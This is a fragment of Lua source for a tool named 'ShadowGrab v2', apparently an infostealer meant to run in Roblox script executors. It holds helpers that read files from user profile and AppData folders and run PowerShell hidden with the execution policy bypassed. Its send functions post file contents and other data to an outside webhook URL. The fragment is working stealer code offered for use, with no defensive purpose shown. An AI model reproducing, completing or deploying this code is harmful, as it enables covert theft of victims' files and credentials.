-- ═══════════════════════════════════════════
-- HTTP WRAPPER (multi-executor support)
-- ═══════════════════════════════════════════
local function HttpPost(url, body)
    -- try syn / fluxus / krnl / etc request variants
    local req = request or syn.request or http_request or http.request or (http and http.request) or (syn and syn.request) or (fluxus and fluxus.request)
    
    if not req then
        warn("ShadowGrab: no request function found in this executor")
        return false
    end
    
    local ok, err = pcall(function()
        req({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = body,
        })
    end)
    
    return ok
end

-- ═══════════════════════════════════════════
-- FILE/PS UTILS
-- ═══════════════════════════════════════════
local TEMP = os.getenv("TEMP") or os.getenv("TMP") or "C:\\Windows\\Temp"
local APPDATA = os.getenv("APPDATA") or ""
local LOCALAPPDATA = os.getenv("LOCALAPPDATA") or ""
local USERPROFILE = os.getenv("USERPROFILE") or ""

local function FileExists(path)
    if not path then return false end
    local f = io.open(path, "r")
    if f then f:close(); return true end
    return false
end

local function ReadFile(path)
    if not FileExists(path) then return nil end
    local f = io.open(path, "rb")
    if not f then return nil end
    local content = f:read("*a")
    f:close()
    return content
end

local function GetSize(path)
    if not FileExists(path) then return 0 end
    local f = io.open(path, "rb")
    if not f then return 0 end
    f:seek("end")
    local size = f:seek()
    f:close()
    return size
end

local function RunPS(script)
    local tmp = TEMP .. "\\sg_" .. tostring(os.time()) .. "_" .. tostring(math.random(1000,9999)) .. ".ps1"
    local f = io.open(tmp, "w")
    if not f then return "" end
    f:write(script)
    f:close()
    local handle = io.popen('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "' .. tmp .. '"')
    if not handle then pcall(os.remove, tmp); return "" end
    local result = handle:read("*a") or ""
    handle:close()
    pcall(os.remove, tmp)
    return result
end

local function Truncate(str, max)
    if not str then return "" end
    if #str <= max then return str end
    return str:sub(1, max) .. "..."
end

local function JSONEncode(tbl)
    if HttpService then
        local ok, res = pcall(function() return HttpService:JSONEncode(tbl) end)
        if ok then return res end
    end
    -- fallback manual
    local function enc(v)
        local t = type(v)
        if t == "string" then return '"' .. v:gsub('\\', '\\\\'):gsub('"', '\\"') .. '"' end
        if t == "number" or t == "boolean" then return tostring(v) end
        if t == "table" then
            local arr, obj = {}, {}
            local isarr = true
            for k, _ in pairs(v) do if type(k) ~= "number" then isarr = false; break end end
            for k, val in pairs(v) do
                if isarr then
                    arr[#arr+1] = enc(val)
                else
                    obj[#obj+1] = '"' .. tostring(k) .. '":' .. enc(val)
                end
            end
            if isarr then return "[" .. table.concat(arr, ",") .. "]" end
            return "{" .. table.concat(obj, ",") .. "}"
        end
        return "null"
    end
    return enc(tbl)
end

-- ═══════════════════════════════════════════
-- SEND FUNCTIONS
-- ═══════════════════════════════════════════
local function SendRaw(content, name)
    HttpPost(WEBHOOK_URL, JSONEncode({
        content = "📄 **" .. (name or "Data") .. "**\n```\n" .. Truncate(content, 1800) .. "\n```",
    }))
end

local function SendEmbed(title, color, fields)
    HttpPost(WEBHOOK_URL, JSONEncode({
        embeds = {{
            title = title,
            color = color or 0x9b59b6,
            fields = fields or {},
            footer = {text = "ShadowGrab v2"},
        }}
    }))
end

local function SendFile(path, name)
    if not FileExists(path) then return end
    if GetSize(path) > SG.Options.MaxFileSize then return end
    local content = ReadFile(path)
    if not content then return end
    HttpPost(WEBHOOK_URL, JSONEncode({
        content = "📎 **" .. name .. "** (" .. tostring(GetSize(path)) .. " bytes)\n```\n" .. Truncate(content, 1500) .. "\n```",
    }))
end

